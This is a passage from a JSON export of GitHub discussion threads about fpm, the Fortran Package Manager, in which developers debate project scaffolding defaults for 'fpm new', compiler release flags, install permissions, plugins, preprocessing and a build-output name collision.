\"do you need coarrays?\" \"do you need to add options to load external libraries?\" but nothing solid on that. At some point I am sure there will be a doc/ directory as well but nothing will probably need built there unless we start supplying utilities to convert flat text or markdown to HTML|PDF|*roff.\nBut, for example, if no one else wants a bench/ directory added but I do if I could add bench/ to the auto-search and could say\nrun NAME --dir bench  (especially with aliases like rfpm @bench NAME  or some other ability like git(1) has to add aliases but that is another story)  I would be relatively happy."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-21 12:11:15+00:00",
                    "text": "I think example/ and a program source file in it should be created by default, as originally implemented in this PR, and for the same reason that @urbanjost explained above.\n\nI agree that we should encourage good practices such as including tests and examples; however, unlike tests which are needed during development, examples are usually the very last thing I add, after stabilising the API interfaces and writing documentation. Hence if an example is created by default, for me at least, it would remain a redundant stub for the majority of the development time. I would probably immediately delete the example folder if created by default."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-21 12:19:17+00:00",
                    "text": "I'm also in support of your suggestion @urbanjost of not writing explicit entries for executables/tests/examples in the manifest when using 'fpm new' and instead relying on the automatic source discovery; this simplifies the experience IMO. Explicit entries for tests and executables are now only required for non-standard package layouts or per-executable dependencies."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-21 23:10:28+00:00",
                    "text": "Throwing this approach out there as a way to compromise between being able to setup for a basic package with the simplest possible interface but also providing for an introduction to producing a full large package. A new user entering \"new\" and seeing nothing but a blank slate and having to dig in for every next step is not good either, so perhaps this approach works. I know it took me a while using an early prototype to answer \"and now what?\".  So a new user can enter \"fpm new A\" and go into \"A\" and run \"fpm build\", \"fpm run\", and \"fpm test\" and have something intuitive happen with nothing but metadata in the toml file, which is a good introduction to a basic setup and shows how easy it can be to use; but hopefully having read the documentation at some point for \"new\" he can seed a project that describes more complex options and makes a working directory with a complex example file.  For more than that I think a --template option and/or having simple examples in a repository would be nice too.  The HTML document is changing rather rapidly at this point, but perhaps a \"fpm help manifest\" would be worthwhile.  So functionally this provides a solution for the two major divergent needs.  Not sure it is quite elegant myself though.  So\n\nfpm new A   # A bare-bones starter with the simplest configuration\nfpm new B --verbose  # A similar project but with the full default file structure and a detailed annotated manifest"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-12-21 23:16:22+00:00",
                    "text": "To me --verbose should only ever affect output to stdout, and not what's being created in the process. Perhaps a different word, like, --full or --all is more appropriate?\nThough I'd prefer fpm new A --clean or fpm new A --bare for a bare-bones starter, and just fpm new A for everything.\nThese are only 2 ends of the spectrum. Some middle ground could also be an option (like what I think @LKedward and @awvwgk prefer)."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-21 23:27:15+00:00",
                    "text": "Creating a \u201cfull\u201d manifest should be easier than having to hard-code everything. Also, is there a check to verify that the hard-coded TOML document is a valid TOML document except for running fpm new [--verbose] test && cd test && fpm run?\nI would suggest to generate the TOML data structure by using the TOML-Fortran build interface (set_value, add_table, add_array) and than accept a serializer (pass an instance of a toml_serializer to the accept procedure of the toml_table). To verify and generate the full package manifest the built TOML data structure can be passed to the new_package routine, on exit the TOML data structure will contain all default values and can be just serialized.\nEdit: You can check with a minimal fpm project depending on fpm:\nprogram prog\n  use fpm_toml\n  use fpm_manifest_package\n  use fpm_error\n  implicit none\n  type(toml_table) :: table\n  type(toml_serializer) :: ser\n  type(package_config_t) :: package\n  type(error_t), allocatable :: error\n  table = toml_table()\n  ser = toml_serializer()\n  call set_value(table, \"name\", \"example\")\n  ! continue building of manifest\n  ! ...\n  call new_package(package, table, error)\n  if (allocated(error)) error stop\n  call table%accept(ser)\nend program prog"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-22 05:50:01+00:00",
                    "text": "So, combining the above:\nfpm new A      # makes what it did before except it creates example/ but in such a way that deleting example/ or test/ or app/ \n                      # does not require changing the manifest file\nfpm new A --full   # creates the same but with a heavily annotted manifest file, and maybe more later like a dependency on\n                            # stdlib\nfpm new A --bare  # makes no directories or sample Fortran source\nThe small manifest file is made by calls so it should be self-verifying\nThe annotated manifest (whose main purpose is to be verbose and annotated) is built manually but run through a verification\nroutine.\n--verbose now displays the verified components of the manifest file.\nSo @certik and I get the example/ directory;  and the TOML is verified and you can start out with nothing if you are an advanced user and the default manifest depends on auto-completion so deleting directories will not hurt till you have nothing to build at all for everyone else; with a low, medium and high setting.\nExcept my validate routine did not work.  I added a typo (literally the line \"[typo]\" and my routine did not complain. Before I spend too much time on that I think someone will now immediately what I did wrong in the validation  routine?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-22 09:54:03+00:00",
                    "text": "Except my validate routine did not work.  I added a typo (literally the line \"[typo]\" and my routine did not complain. Before I spend too much time on that I think someone will now immediately what I did wrong in the validation  routine?\n\nThe validation routine looks fine too me. If you literally added [typo] on a line this is still valid TOML, not a valid fpm manifest, but that is not checked for in toml_parse but only in get_package_data. Since the TOML document is static, the validation check should be part of the testsuite rather than the runtime."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-22 12:39:15+00:00",
                    "text": "OK; I was holding off on the test suite until there was some kind of consensus on the format. Because I want heavy annotation it seems easier to continue to build the --full file \"manually\", hence the two approaches for buildng the file. For people with WWW access I think pulling down templates or examples would be useful, as configuring manifests seems to be the universal complaint about package managers and using the TOML files the first few times can be difficult (no matter what TOML stands for).  There is not, as @certik pointed out, one problem with one solution here. What a new user needs is quite different than  someone with dozens of packages; but I imagine a good deal of users will only make one or two packages so it being easy for a new user to set up a package is a critical point for getting fpm accepted.\nThe auto-discovery and support of link options and C has moved that along immensely.  I tried with just a basic graphics package and the need for X11 and C  early on and it was difficult with h-fpm and a show-stopper for f-fpm. Now, with no fpm.mk and a manifest with nothing but a link directive and metadata I can build the library with mixed C and Fortran and build, run a dozen sample programs and run dozens of test cases and it can be used as an external dependency. Nice and Easy.\nSo is this too complicated or does this three-pronged approach satisfy anyone?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-22 13:43:23+00:00",
                    "text": "Apologies @urbanjost, I didn't mean to complicate everything with my comments, but it seems you've come up with a nice solution!\nfpm new covers my most common use case for quickly spinning up a new project whereas fpm new --full is well suited to beginners who may benefit from seeing the explicit manifest entries."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-12-22 17:23:30+00:00",
                    "text": "I apologize, I didn't realize that in this thread we were discussing both what directories to create and what metadata to put into the manifest by default. Everything I wrote so far I meant only for creating directories and files but I didn't consider what to do with the manifest.\n@urbanjost's latest proposal looks good to me."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-23 02:26:53+00:00",
                    "text": "It is interesting that just a few stub files exposes how differently everyone can work.  I use a preprocessor that allows for flat text documentation to be placed right in the source file and vim(1) folding so show just text or just code when I want ( a nice feature of vim, but I usually just edit the files anymore as-is) and part of the documentation is (almost) always a simple working example of the routine, so I  have demo routines long before the package is complete. When not involved with the WWW I also have a testing framework that builds up unit tests with builds building an SQLite file with tallies of test results, but that requires so much infrastructure to be assumed I have moved most of my testing external to the code. Where I can use that it allows you to call a single routine in the library that does confididences tests for that particular build which can be handy.  So as soon as I have a src/ or app/ I need an example/; albeit in a way they act as initial confidence tests more than examples. I have already seen in a relatively small group here that each has a different preference for what is created or not, which is interesting.\nBut for a a new user whatever gets created should do something with the core commands (build, test, run) and the default here does.  It should also not be a puzzle to figure out  the TOML file synax immediately if you delete something you decide you do not need, which this does. But I new user needs as much help with the TOML configuraion as possible, and in the earlier versions it was a black box and you had to bounce around half a dozen web sites to piece together how to use it, and this and more complete documentation is helping with that; and for an old-hand the --bare option saves a few commands but lets them build their own so I am happy with this as a compromise. It has the low/middle/high capabilities brought up earlier.\ntime for a ~/.fpmconfig?\nIt introduces a lot of dependencies and system-dependencies but I would really like new to read the [user] data a lot of git(1) users have in their .gitconfig files and the TOML file could literally be a black box for basic projects now that auto-discovery has advanced so much.  In lieu of piggy-backing on .git (which hg users might not be fond of]  are there other uses needed now that would justify  creating a ~/.fpmconfig file other than username and email?  Maybe a default compiler for builds?"
                },
                {
                    "user": "certik",
                    "date": "2020-12-24 12:36:34+00:00",
                    "text": "Just like Sebastian, I felt it should not create examples by default.\n\nUrbanjost explained above why it's a good idea to include them by default.\n\nI think it's for a wider discussion what the default behavior should be.\n\nContrary to what was said, I use new very frequently, just like git init. I use it for all kinds of quick projects to test things out. So the default behavior matters a lot I think.\n\u2026\nOn Sun, Dec 20, 2020, at 5:29 PM, Milan Curcic wrote:\n\n\n I think example/ and a program source file in it should be created by\n default, as originally implemented in this PR, and for the same reason\n that @urbanjost <https://github.com/urbanjost> explained above.\n\n Let's get more eyes on this. @certik <https://github.com/certik>\n @everythingfunctional <https://github.com/everythingfunctional>\n @LKedward <https://github.com/LKedward> what do you think is a saner\n default?\n\n Otherwise I think this PR is good to go.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#316 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWG5PD7YAMYOUTWER2DSV2JF3ANCNFSM4VBOAU7Q>."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-30 13:06:17+00:00",
                    "text": "@urbanjost could you bring this branch up-to-date with the default branch again. I'll try to have a look over the changes hopefully next week(end)."
                }
            ]
        },
        {
            "number": 315,
            "user": "LKedward",
            "date": "2020-12-18 11:14:48+00:00",
            "title": "Remove: -ffast-math in gfortran default release flags",
            "text": "I think it has been agreed generally in previous discussions that -ffast-math should be an opt-in option by the package maintainer rather than enabled by default. This PR therefore removes -ffast-math from the gfortran default flags for --release.\nI encountered this because the stdlib testsuite does not pass with fpm test --release when using stdlib with fpm.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-18 13:44:12+00:00",
                    "text": "For consistency they should be removed from the Haskell version as well:\n\n  \n    \n      fpm/bootstrap/src/Fpm.hs\n    \n    \n         Line 684\n      in\n      483f23b\n    \n    \n    \n    \n\n        \n          \n           , \"-ffast-math\" \n        \n    \n  \n\n\n\n  \n    \n      fpm/bootstrap/src/Fpm.hs\n    \n    \n         Line 717\n      in\n      483f23b\n    \n    \n    \n    \n\n        \n          \n           , \"-ffast-math\" \n        \n    \n  \n\n\n\n  \n    \n      fpm/bootstrap/src/Fpm.hs\n    \n    \n         Line 745\n      in\n      483f23b\n    \n    \n    \n    \n\n        \n          \n           , \"-ffast-math\""
                },
                {
                    "user": "certik",
                    "date": "2020-12-23 00:26:51+00:00",
                    "text": "This PR is fine, as a quick fix, but it is not the long term solution because we are leaving a lot of performance on the table. So I opened an issue #329 to brainstorm a solution to this."
                }
            ]
        },
        {
            "number": 314,
            "user": "awvwgk",
            "date": "2020-12-18 11:13:38+00:00",
            "title": "Allow file permissions for fpm-install",
            "text": "Currently the install command can only copy files from the build directory to a prefix. As pointed out in #257 it would be helpful to define permissions for the installed executables as well.\nFor this purpose we could search for the install program and leverage the built-in permission handling or do the permissions ourselves using chmod. This will probably be limited to POSIX platforms (Unix and Cygwin).",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-12-19 01:56:04+00:00",
                    "text": "There is a WHICH(3f) function in  my collection I added to M_io.f90 that might be useful.  I wrote it for POSIX and Windows but have not used MSWindows much but if it does not work there I think it would be easy to change.M_io.\nIt gets the environment variable PATH and then parses it and then joins it with the command name and then uses INQUIRE to see if the file exists.  If install is not there it could look for chmod or whatever other systems have that might be equivalent. I just pulled it into M_io and did not test it much but the idea has worked successfully in several situations -- looking on a system to see which Adobe PDF viewer can be found, what browers are available, what GIF display command is available, ... . I need to add a unit test for it and do some testing but that should not prevent you from taking a quick look to see if the idea appeals to you.\n."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-19 01:59:44+00:00",
                    "text": "It calls a few other procedures, but copies or equivalents are already in fpm --- split, join_path (or joinpath?), instead of the separator function there is an OS detection routine that would give you the same feature and would cut down on duplication.\nIf you want me to make an \"fpm\" version let me know.\nI guess now all I have to say instead is\n cd /tmp\n git clone https://github.com/urbanjost/M_io\n cd M_io\n fpm run --example demo_which\nbefore install existed in fpm I was using a shell script called \"fpm-install\" that might be relevant\n#!/bin/bash\n#@(#) install executables in directory (assuming install(1) exists)\nDIR=${FPM_INSTALL_DIR:-\"$HOME/.local/bin\"}\nmkdir -p $DIR\nffpm run  --release --compiler gfortran --runner \"install -vbp -m 0711 -t $DIR\" $*"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-19 16:23:34+00:00",
                    "text": "I have a similar path-reader in one of my projects (here), which I use to search for config or parameter files. This one could be repurposed as which clone as well.\nThis sounds like a feature for stdlib_os in my opinion. I wonder if we could port this one easily from CMake to fpm?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-20 23:00:09+00:00",
                    "text": "Amazing project.  Lost myself for a while in it.  Tried moving it to fpm and get hung up with Fortran fpm not having an fpm.mk option and there being no way without making a custom version or using backdoors like ifort configuration files to customize the compiles and links with fpm yet. That stopped me with some much simpler projects that just required X11 Windows or an external package.  Have tried a few approaches (including response files which I added to a newer version of M_CLI2, and \"external packages\" that really were not a package, looked at some other package managers ..) and really did not find anything that did not seem like a kludge or required so much customizing it was easier to just do it with Make/CMake ...) . Maybe there is no elegantly simple way to handle cuda/MPI/OpenMPI/OpenACC/coarrays... until coarrays develops further).\nSo I am thinking the main point is it does not have to be simple to set up, but able to be packaged in such a way it is simple for a user of the package to use as much as possible. Allowing multiple compilers complicates that too.  My own system builds everything into a production layout directly, where two variables (one for OS, one for a compiler) to build the directory. The two variables are set automatically but can be set by the user. So instead of \"Linux\" and \"ifort\" you can make up other names like \"ifort_coarray\" and add an entry in a file that defines the switches, but that does not quite fit the fpm model. The solution has to bundle with the package to be easily useable by an end-user of the package."
                }
            ]
        },
        {
            "number": 313,
            "user": "certik",
            "date": "2020-12-17 19:28:38+00:00",
            "title": "Create plugin system for extending `fpm` from 3rd party packages",
            "text": "This was first mentioned here:\n#309 (reply in thread)\nThe idea is that people are already writing many 3rd party tools for everything from formatting, automatic documentation lookups, pre-processors, etc. Many of these tools require to understand the structure of the project, which fpm knows and can provide to them, so that lfortran fmt can format your whole project, it would get the list of files from fpm.\nIt could go the other way too, so that fman can register a new command fpm man, which would look up things, or lfortran can register fpm fmt. Similar to how git can be extended by simply providing a tool git-something in a $PATH and git something becomes available.\nThe way various Jupyter kernels register with jupyter is that they simply create a file in $PREFIX/share/jupyter/kernels/fortran/kernel.json, which creates a fortran kernel. So in the same way, fman can install a file $PREFIX/share/fpm/plugins/fman/plugin.json which has information where to find fman and anything else needed for fpm to be able to call it. The way this works with Jupyter is that you just install lfortran (say using conda install lfortran) and it will automatically appear in Jupyter as an optional kernel, users do not have to do anything, it just works.\nLet's brainstorm this more.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-17 19:39:42+00:00",
                    "text": "See #211 for a previous occurrence of this suggestion."
                },
                {
                    "user": "certik",
                    "date": "2020-12-17 19:44:08+00:00",
                    "text": "Thanks, I missed that. I'll copy my text above to that issue."
                }
            ]
        },
        {
            "number": 308,
            "user": "everythingfunctional",
            "date": "2020-12-15 21:15:00+00:00",
            "title": "A Long Term Goal For Preprocessing",
            "text": "A killer functionality that would be nice to have as part of fpm, would be the ability to use Fortran code to generate Fortran code as part of preprocessing a source file.\nRust has intelligent macros, which provide a similar capability. I don't remember if it's part of stack or the Haskell language itself, but they have a directive which can call a tool, which might be built as part of the current package, to generate some source code. For example, I created a testing framework in Haskell (here) similar to my vegetables framework, where the \"main\" test program only contains the following line:\n{-# OPTIONS_GHC -F -pgmF hedge-trimmer #-}\nIt would be awesome if my test driver program could contain just a similar line.",
            "comments": [
                {
                    "user": "ivan-pi",
                    "date": "2020-12-16 10:56:42+00:00",
                    "text": "I can't find the thread right now, but I recall reading the minutes from a standards committee meeting (perhaps related to generics?), where they decided not to pursue intelligent macros as part of the language. This means that any potential preprocessing facilities we invent would be specific to fpm.\nDo you have any other motivations for such meta-programming facilities apart from unit testing? Is what you have in mind similar in functionality to Julia's @test macro? I think D also has a similar unit test capability, e.g. if you look into the D ascii module you find code like this:\n/++\n    Params: c = The character to test.\n    Returns: Whether `c` is a letter or a number (0 .. 9, a .. z, A .. Z).\n  +/\nbool isAlphaNum(dchar c) @safe pure nothrow @nogc\n{\n    return c <= 'z' && c >= '0' && (c <= '9' || c >= 'a' || (c >= 'A' && c <= 'Z'));\n}\n///\n@safe pure nothrow @nogc unittest\n{\n    assert( isAlphaNum('A'));\n    assert( isAlphaNum('1'));\n    assert(!isAlphaNum('#'));\n    // N.B.: does not return true for non-ASCII Unicode alphanumerics:\n    assert(!isAlphaNum('\u00e1'));\n}\nI was thinking in the past of prototyping something like this as a demonstration of using symengine.f90. The idea was you could do your symbolic manipulation in Fortran, and then \"print\" the resulting symbolic expressions into Fortran commands. Building upon my example from Discourse, I envisioned something like:\nreal :: aw, daw_dX, daw_dT\n\n$symengine\n\n! Initialize symbols\ncall symbols(X, T, a1, a2, b1, b2, 'X T a1 a2 b1 b2')\n\n! Define symbolic expressions\na = a1 + a2*T\nb = b1 + b2*T\naw = (X/a)**(1/b)/(1 + (X/a)**(1/b)) \n\n! Find symbolic derivatives with respect to X and T\ndaw_dX = sp.diff(aw,X)\ndaw_dT = sp.diff(aw,T)\n\ncall fcode(cse([aw, daw_dX, daw_dT]), ['aw','daw_dX','daw_dT'])\n\n$end symengine\n\nwhich would get compiled and linked with symengine in a first pass, and executed to produce the following Fortran source output:\nblock\n    real :: x0, x1, x2, x3, x4, x5, x6, x7\n    x0 = T*a2 + a1\n    x1 = 1d0/x0\n    x2 = X*x1\n    x3 = T*b2 + b1\n    x4 = 1d0/x3\n    x5 = x2**x4\n    x6 = x5 + 1\n    x7 = x5/x6**2\n    aw = x5/x6\n    daw_dX = x4*x7/X\n    daw_dT = -x1*x7*(a2*x3 + b2*x0*log(x2))/x3**2\nend block\n\nI am worried this development cycle is kind of convoluted, and there are many points of failure. If you make errors in your symbolic manipulation section, how are they communicated back to you? This kind of meta-programming is perhaps suitable in something like a Jupyter notebook, but so far I am not convinced it can work in static text files. Since my Fortran source code only needs to be developed once, what is the benefit versus doing my symbolic manipulation in Python or MATLAB and just copying the output to my Fortran source directly?"
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-12-16 11:18:34+00:00",
                    "text": "The preprocessor thread over at j3-fortran contains multiple interesting views from compiler developers, those involved in the standards committee and also users. The prevailing thought seemed to be that it is best to avoid it."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-16 14:07:00+00:00",
                    "text": "Hi @ivan-pi , I caught wind of some of the discussions around intelligent macros, and fully understand why they aren't a good idea for the standard. It's basically just a step way too far in complexity for compilers to implement (at least right now, and maybe ever). I also think they're a pretty difficult feature for programmers to use. Using a well designed macro wouldn't be that hard, but writing one sure would be.\nMy use case was primarily for the purposes of unit testing, but I could see it being useful for other sorts of code generation.  I wouldn't necessarily expect the code that does the generation to be inline though; more like a simple call to an external program whose outputs get substituted in.\nI was mostly just throwing the idea out the to see what other solutions there might be and get the wheels turning. I don't expect to solve this one any time soon."
                },
                {
                    "user": "certik",
                    "date": "2020-12-17 18:28:52+00:00",
                    "text": "Yes, I asked @everythingfunctional to open an issue for this, as he mentioned this at our last Fortran call.\nIt's a broader issue of: do we want to use fpm as a vehicle to extend Fortran, or to provide default pre-processing (for all compilers, for example using fypp), etc.\nAnd for now I recommend to stick to standard Fortran. We can still deliver most of our goals with that.\nIn general, I would like to see Fortran being used without pre-processing.\nIf it turns out there is no other way, we can (in the future) make fpm do all kinds of default pre-processing."
                },
                {
                    "user": "interkosmos",
                    "date": "2021-01-26 20:05:17+00:00",
                    "text": "C preprocessor macros are probably the most common, and they are supported (at least) by GNU Fortran, IFORT, and LLVM. The only problem is that the different implementations do not predefine the same macros. It should therefore be the task if fpm to set common macros (e.g., operating system identifier) if preprocessing/conditional compilation is selected."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2021-01-27 07:48:38+00:00",
                    "text": "Another problem is that the C preprocessor does not conform to Fortran\nsyntax. That limits the kinds of macros that you can reasonably apply. But\nan #if ... #endif construction is probably safe.\n\nOp di 26 jan. 2021 om 21:05 schreef Philipp <notifications@github.com>:\n\u2026\n C preprocessor macros <https://en.wikipedia.org/wiki/C_preprocessor> are\n probably the most common, and they are supported (at least) by GNU Fortran,\n IFORT, and LLVM. The only problem is that the different implementations do\n not predefine the same macros. It should therefore be the task if *fpm*\n to set common macros (e.g., operating system identifier) if\n preprocessing/conditional compilation is selected.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#308 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR3Q6NYUH27YZVAY7CLS34OAZANCNFSM4U47H6UA>\n ."
                }
            ]
        },
        {
            "number": 307,
            "user": "LKedward",
            "date": "2020-12-15 10:07:11+00:00",
            "title": "Fix: program object file collision",
            "text": "Simplifies object naming rules to avoid issue where programs in different top-level folders can have the same object file name\nPlaces example executables in a different build/ subfolder to app executables\nAdd another example program to with_example demo to test for the collision\n\nFixes: #305",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-16 11:39:31+00:00",
                    "text": "So what should I expect with the following?\n\nAh I see that I have only fixed one of the two problems; I'll update to put example executables in a separate 'example' subdirectory as suggested to avoid clashes with executables in 'app'."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-16 13:45:43+00:00",
                    "text": "Okay I think I've addressed both collision issues now: both object files and executables are kept separate between conventional apps and examples.\n(The current release is now quite out-of-date so I've also bumped the patch number for a new release after merging.)"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-17 16:15:32+00:00",
                    "text": "That fixes the issues with the \"default\" directories.  The Haskell version takes that a step further such that even an arbitrary user-specified directory does not have collisions either.  That would take putting everything in it's own subdirectory or hashing the names like h-fpm does, but this looks good;  and I find that when it is a problem I really should be breaking the package in to more subpackages, like \"oldversion\" and \"newversion\"  (creating updated versions while keeping the old version available  in the same package was something I was doing with h-fpm that this complicated with f-fpm). Looks good so far; doing a little bit more testing."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-18 11:27:43+00:00",
                    "text": "Thanks for reviewing both, I'll now merge and prepare a new prelease."
                }
            ]
        },
        {
            "number": 306,
            "user": "urbanjost",
            "date": "2020-12-14 22:20:51+00:00",
            "title": "Add --example to the \"new\" subcommand",
            "text": "After install  is merged  I planned on a quick update of  the new subcommand to create an example/ directory and to add a --example switch.\nI  am proposing that it defaults to making the example/ directory like it does the others  (src/,app/,test/).\nShould be a lot simpler than install and it is likely there will be collisions requiring refactoring and install appears imminent so unless I am underestimating something I was just going to wait a bit but have tried it using the current alpha so it can literally follow on the heels  of install.",
            "comments": []
        },
        {
            "number": 305,
            "user": "urbanjost",
            "date": "2020-12-14 18:37:01+00:00",
            "title": "name collision between  example/main.f90 and app/main.f90",
            "text": "Files built with the test command go into build//test/ and with the run command into  build//app but files built from the example/\ndirectory also go into the app/ directory.  The files are built with their object files named after their original filenames, so if you have\ntest/main.f90 and app/main.f90 .  But if you add example/main.f90\nit gets placed in the same place as the app files, so you cannot build because there is a filename collision.\nThere are a few approaches.  The examples could be build in an example/ subdirectory in build like test  (probably the simplest) or they could be built with their target name  (which in this case is different in the fpm.toml file) or the pathname where they were found could be used to build the file,  or the user can just rename a source file and it can be left as-is.\nOn a related note,  you add the  --example switch to run to  build examples, but have the test command to run tests.  So far test and run have not diverged in functionality.   I would suggest  that we add --test to the run command and then add an example command and change the documentation for test  to say it is just an alias for run --test  and add a new command called example and say it is just an alias for  run --example. As it is there is the inconsistency on how to run test applications versus example applications,  but I strongly prefer using test versus run --test and would prefer a command called example versus run --example.\nI also wonder if there should be an --app switch. The default would be --app if none of the three are specified, perhaps?  That way\nif you wanted you could run all of them with run --app --example --test, although I am not sure that is required(?).  In general I run them one at a time myself. and would be fine with removing the --example switch from run and having a separate command as is now the case with test called example.\nI would expect a fpm.toml file like\n name = \"A\"\nversion = \"0.1.0\"\nlicense = \"license\"\nauthor = \"Jane Doe\"\nmaintainer = \"jane.doe@example.com\"\ncopyright = \"2020 Jane Doe\"\n\n[build]\nauto-executables = false\nauto-tests = false\nauto-examples = false\n\n[library]\nsource-dir=\"src\"\n\n[[test]]\nname=\"runTests\"\nsource-dir=\"test\"\nmain=\"main.f90\"\n\n[[example]]\nname=\"runExample\"\nsource-dir=\"example\"\nmain=\"main.f90\"\n\n[[executable]]\nname=\"A\"\nsource-dir=\"app\"\nmain=\"main.f90\"\n\nto work even without turning off the auto build, as it does now for a test and and app; but it does not. Certainly with no auto builds I thought it would.  Otherwise we need to indicate such collisions must be avoided by the user, which till now we have protected them from.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-14 18:45:19+00:00",
                    "text": "The same happens with a project using a setup like\nname = \"collision\"\n\n[[executable]]\nname = \"exe1\"\nsource-dir = \"app1\"\nmain = \"main.f90\"\n\n[[executable]]\nname = \"exe2\"\nsource-dir = \"app2\"\nmain = \"main.f90\"\nRunning Fortran fpm we get:\n Error while building target list: duplicate output object \"build/gfortran_debug/app/main.f90.o\"\n  Source file: \"app2/main.f90\"\nSTOP 1"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-14 19:03:16+00:00",
                    "text": "On a related note, you add the --example switch to run to build examples, but have the test command to run tests. So far test and run have not diverged in functionality. I would suggest that we add --test to the run command and then add an example command and change the documentation for test to say it is just an alias for run --test and add a new command called example and say it is just an alias for run --example. As it is there is the inconsistency on how to run test applications versus example applications, but I strongly prefer using test versus run --test and would prefer a command called example versus run --example.\n\nI thought about an example as a special kind of runable target, therefore I grouped it with run --example to the run command.  The equivalent for a testable target might be a benchmark which would nicely fit into the current scheme with test --benchmark."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-14 20:25:47+00:00",
                    "text": "Thanks both for reporting the two collision cases. I think I know where this needs to be fixed, I'll have a go at a fix tomorrow."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-14 21:45:01+00:00",
                    "text": "It seems more consistent to me to have  run  [--test|--benchmark|-example|--app] and have corresponding directories test/, benchmark/, example/, and app/ as special pre-defined directories,  or to have run  app/ example/ where instead of programs being selected a directory could be selected, where if the name contains a separator it is assumed to be a directory.  I would call my examples more \"test\" than \"app\" so I would not look for them under run  I would look under test.  I think allowing directory names as a name would be the most general in that it would allow a user to target a grouping of their own category, and alleviates having to alter the fpm.toml file each time a different  program is selected. And since test is just such a case when nothing is specified in the TOML file it seems relatively natural.  Of course,  I think I could have all the sources in a single directory and explicitly specify everything in the TOML file  as to what is test,  example, and app (but I have not actually tried that).\nIf I was a new user I think run being able to run any executable would be the most intuitive, and names like test, bench, example would be nice additions but mean I only have to read one command description and do not have to look around for how to run a file.\nExcept (probably) for compiler directives I think as much should work as possible without anything but a simple metadata TOML file,\nand that editing the TOML file should only be required for someone building a complex project.  I think Fortran more than any other language is used as a tool by non-programmers  but ironically has less pre-built tools. So I am picturing someone that knows how to\ncompile a program, use a text editor, and knowing maybe a little git or hg or CVS being able to use fpm(1) without having at first learn about CMake, Make, ar,  exotic compiler options, ... . It seems easier to tell someone who wants to run a program to use run; and if they have tests, benchmarks, and examples there is a nice shortcut available.  Got to admit there is a lot personal baggage in deciding that.   I tend to think of what would be the simplest to explain to someone that had never heard of it and go from there though."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-12-15 07:08:42+00:00",
                    "text": "Well, this was certainly one reason to write the minibook on building\nprograms in the first place :). And on the various forums (fora?) I see\nenough questions that suggest that the poster is indeed a member of that\ncategory. So let us keep that scenario in mind indeed.\n\nOp ma 14 dec. 2020 om 22:45 schreef urbanjost <notifications@github.com>:\n\u2026\n It seems more consistent to me to have run\n [--test|--benchmark|-example|--app] and have corresponding directories\n test/, benchmark/, example/, and app/ as special pre-defined directories,\n or to have run app/ example/ where instead of programs being selected a\n directory could be selected, where if the name contains a separator it is\n assumed to be a directory. I would call my examples more \"test\" than \"app\"\n so I would not look for them under run I would look undertest. I think\n allowing directory names as a name would be the most general in that it\n would allow a user to target a grouping of their own category, and\n alleviates having to alter the fpm.tomlfile each time a different program\n is selected. And sincetest` is just such a case when nothing is specified\n in the TOML file it seems relatively natural. Of course, I think I could\n have all the sources in a single directory and explicitly specify\n everything in the TOML file as to what is test, example, and app (but I\n have not actually tried that).\n\n If I was a new user I think run being able to run any executable would be\n the most intuitive, and names like test, bench, example would be nice\n additions but mean I only have to read one command description and do not\n have to look around for how to run a file.\n\n Except (probably) for compiler directives I think as much should work as\n possible without anything but a simple metadata TOML file,\n and that editing the TOML file should only be required for someone\n building a complex project. I think Fortran more than any other language is\n used as a tool by non-programmers but ironically has less pre-built tools.\n So I am picturing someone that knows how to\n compile a program, use a text editor, and knowing maybe a little git or hg\n or CVS being able to use fpm(1) without having at first learn about CMake,\n Make, ar, exotic compiler options, ... . It seems easier to tell someone\n who wants to run a program to use run; and if they have tests,\n benchmarks, and examples there is a nice shortcut available. Got to admit\n there is a lot personal baggage in deciding that. I tend to think of what\n would be the simplest to explain to someone that had never heard of it and\n go from there though.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#305 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR5S72KTYRMWM3XDCN3SU2BO3ANCNFSM4U3FB7HA>\n ."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-15 10:05:13+00:00",
                    "text": "It seems more consistent to me to have run [--test|--benchmark|-example|--app] and have corresponding directories test/, benchmark/, example/, and app/ as special pre-defined directories\n\nThis seems like a good idea to me but while also keeping fpm test as an alias for fpm run --test since having a test command is a common expectation. I prefer this to adding more top-level commands for benchmark and example."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-15 14:04:45+00:00",
